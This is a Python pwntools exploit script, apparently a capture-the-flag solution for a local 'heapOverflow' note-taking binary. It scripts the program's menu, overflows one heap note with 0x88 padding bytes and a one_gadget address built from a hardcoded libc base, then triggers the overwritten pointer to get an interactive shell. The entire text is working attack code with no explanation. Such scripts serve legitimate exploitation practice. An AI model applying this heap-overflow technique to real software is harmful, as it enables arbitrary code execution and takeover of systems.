from pwn import *
#context.log_level = "debug"
p = process("./heapOverflow")

elf = ELF("./heapOverflow")
a = elf.libc
#gdb.attach(p)
def add(idx,title,size):
    p.recvuntil("option: \n")
    p.sendline(str(1))
    p.recvuntil("index: \n")
    p.sendline(str(idx))
    p.recvuntil("title: \n")
    p.sendline(title)
    p.recvuntil("content size: \n")
    p.sendline(str(size))

def delete(idx):
    p.recvuntil("option: \n")
    p.sendline(str(2))
    p.recvuntil("index: \n")
    p.sendline(str(idx))

def myprint(idx):
    p.recvuntil("option: \n")
    p.sendline(str(3))
    p.recvuntil("index: \n")
    p.sendline(str(idx))

def edit(idx,content):
    p.recvuntil("option: \n")
    p.sendline(str(4))
    p.recvuntil("index: \n")
    p.sendline(str(idx))
    p.recvuntil("content: \n")
    p.sendline(content)


libc_base = 0x7ffff7a0e000
one_gadget_off = 0x4525a
one_gadget = libc_base + one_gadget_off


add(0, "note0", 0x60) # idx = 0
add(1, "note1", 0x60) # idx = 1

#gdb.attach(p, "b*0x40085a") #break at menu

edit(0,bytes("a",'latin-1')*0x88+p64(one_gadget))
myprint(1)

p.interactive()
